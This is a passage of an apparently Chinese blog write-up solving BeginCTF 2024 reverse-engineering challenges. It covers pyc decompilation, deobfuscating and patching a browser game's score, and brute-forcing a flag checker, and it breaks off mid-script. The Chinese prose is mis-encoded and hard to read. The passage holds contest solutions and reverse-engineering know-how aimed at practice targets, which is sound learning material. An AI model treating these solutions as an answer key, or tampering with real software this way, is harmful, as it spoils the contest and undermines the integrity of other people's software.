src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707458587664-2288be2f-1fbf-48f6-bb05-c1d12bbd0050.png" class="" title="img"><h2 id="ezpython-1"><a href="#ezpython-1" class="headerlink" title="ezpython-1"></a>ezpython-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707120887922-79327588-3ce5-47ca-889c-07719f070107.png" class="" title="img"><p>æ‰¾ä¸åˆ°keyå’Œencï¼Œè¦å»secret.pycé‡Œæ‰¾</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660671628-821c57a7-deef-4336-8d0c-1258c19ebb75.png" class="" title="img"><p>è¿™å°±è¦æ±‚å¿…é¡»ç”¨python3.8åç¼–è¯‘</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660607445-846ae1d4-c518-4704-8444-17962f2f62fc.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707660956117-41b3e31e-53b3-44e7-b875-4717d0303fe7.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661391820-58a10778-8bae-4a47-8464-5f800a4d648e.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661489059-a1e589b1-a24c-49bf-a156-87d8278485ee.png" class="" title="img"><p>ä¹Ÿå¯ä»¥ç›´æ¥å¤§å¨</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707661564081-3c191d71-680f-4c7a-85dc-b41c9b0ac2d5.png" class="" title="img"><h2 id="stick-game-1"><a href="#stick-game-1" class="headerlink" title="stick game-1"></a>stick game-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707120977289-6e7c1f46-bcd4-4234-b46a-ebd2d1c5d516.png" class="" title="img"><p>ç±»ä¼¼äºè·³ä¸€è·³</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704152734-271b3e52-99a7-4c9d-ba16-b11d4c98fbfa.png" class="" title="img"><p>æœ‰obfusæ··æ·†</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704373259-e33d8342-37ad-4ccc-9e87-3e3abb363947.png" class="" title="img"><p>ç”¨ç½‘ç«™å»æ··æ·†</p><p><a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator</a></p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707704572575-bd25beb4-6c1d-4211-b526-b57cfa846d3c.png" class="" title="img"><p>ä¸€å¼€å§‹let score&#x3D;0,åé¢ä¼šresetGame</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707719106980-8d0bacee-1c6e-4562-846c-0fa381c27f4a.png" class="" title="img"><p>ç›´æ¥å»æ”¹å…³é”®è¯scoreï¼Œå‘ç°åˆ†æ•°å¥½åƒæ²¡å˜</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718134832-1c26d106-c740-403c-a92e-c0f2eb9a921f.png" class="" title="img"><p>è¦ä¹ˆå»case6score+&#x3D;99999999</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720431663-2bee53a4-4c7a-4814-b092-b4519a7d910d.png" class="" title="img"><p>è¦ä¹ˆå»æ”¹scoreElementï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯score</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718559473-d7e47894-cce2-44bc-b222-bf53e08dd3c3.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707718715247-bff32408-cd5a-49de-bb61-7174314e8a34.png" class="" title="img"><p>æ­»äº†æ‰èƒ½è·å¾—flag</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707719633093-d0beac54-2de3-4156-a768-47b095f1bd86.png" class="" title="img"><p>åœ¨htmlç•Œé¢æ‰¾åˆ°å…ƒç´ ä¸‹æ–­ç‚¹ï¼Œç„¶åç©æ¸¸æˆç«‹åˆ»å°±èƒ½æ‰¾åˆ°çœŸæ­£çš„score</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720590048-5302baf7-f35e-47e1-90da-6bdf35dbf34a.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707720616352-aa4c715a-a434-450b-aef4-fa190d33fb0a.png" class="" title="img"><h2 id="arc-1"><a href="#arc-1" class="headerlink" title="arc-1"></a>arc-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707121222466-68e10aee-9032-4ac8-af06-5ca26385b020.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707962263700-ab40b4a7-45cb-4513-b373-5ff93471bfa7.png" class="" title="img"><p>å¤§è‡´æ¥è¯´å°±æ˜¯å­—å…¸å¤ªå¤šï¼Œpydcåç¼–è¯‘ä¸äº†ï¼Œæˆ‘è¿™é‡Œç”¨python3.8.3ç¼–è¯‘ï¼Œç”¨ancondaé»˜è®¤çš„3.8.13ä¸è¡Œ</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707964240587-17304ea3-4469-4d36-9783-74cd9e22e384.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965179736-105d7d87-bd35-49ee-b1dc-c583994edf67.png" class="" title="img"><p>ä¸€è¡Œè¡Œè¿è¡Œï¼Œå¾—åˆ°ç±»ä¼¼ç»“æœ</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965467955-bbf9d5eb-803c-49f6-ad53-fdc1570f8d21.png" class="" title="img"><p>æœ€ç»ˆæ˜¯listé‡Œåˆæ˜¯list</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707965981359-7e524d61-b5d9-402a-a372-f7d8b3cc64c4.png" class="" title="img"><p>æ›¿æ¢ä¹‹åå‘ç°æ˜¯3ç»´åˆ—è¡¨</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707978844528-72da01e6-a317-49d8-b4d6-744c5f4b5d19.png" class="" title="img"><p>æœ€åä¹Ÿå°±æ˜¯è¿™ä¸ªæ ·å­ï¼Œä¸æ‡‚çš„å¯ä»¥é—®gpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span><br>(<br>    <span class="hljs-built_in">all</span><br>    (<br>        [<br>            [data][a][d] == e <br>            <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span><br>            (<br>                [<br>                    [<span class="hljs-built_in">int</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">sum</span>((<span class="hljs-built_in">ord</span>(b) &lt;&lt; <span class="hljs-number">6</span> ^ <span class="hljs-number">4102</span> - a ^ c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;beginCTF&#x27;</span>))).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)] <br>                    <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span><br>                    (<br>                        <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+]Flag: &#x27;</span>)<br>                    )<br>                ]<br>            ) <br>            <span class="hljs-keyword">for</span> d,e <span class="hljs-keyword">in</span> <span class="hljs-built_in">iter</span> <span class="hljs-comment">#è¿­ä»£å™¨</span><br>            (<br>                (<span class="hljs-built_in">enumerate</span>(b))<br>            )<br>        ]<br>    )<br></code></pre></td></tr></table></figure><p>å†™è„šæœ¬çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">data = [[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]]<br><br><span class="hljs-keyword">for</span> i, lst <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data): <span class="hljs-comment">#iæ˜¯ç´¢å¼•ï¼Œlstæ˜¯å­åºåˆ—ï¼ˆæ¯ä¸€è¡Œï¼‰</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>): <span class="hljs-comment">#çˆ†ç ´æœ‰æ•ˆå­—ç¬¦</span><br>        n = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> lst]), <span class="hljs-number">2</span>) <span 